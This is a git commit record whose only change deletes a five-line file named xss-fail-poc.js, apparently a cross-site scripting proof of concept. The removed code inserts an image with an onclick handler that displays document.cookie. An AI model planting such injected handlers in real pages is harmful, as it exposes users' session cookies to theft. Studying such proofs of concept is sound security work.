0a66da5cb549efc445996ea9e05f3e07689466b8
kigihan <kigihan77@gmail.com>
2019-10-24 14:47:30 +0800

    d

--- xss-fail-poc.js
+++
@@ -1,5 +0,0 @@
-var image_show = document.createElement("img");
-image_show.setAttribute("src", "https://fbthumb.dcard.tw/posts/227576956");
-image_show.setAttribute("onclick", "alert(document.cookie)");
-var body = document.getElementById("container");
-body.insertBefore(image_show, body.firstChild);
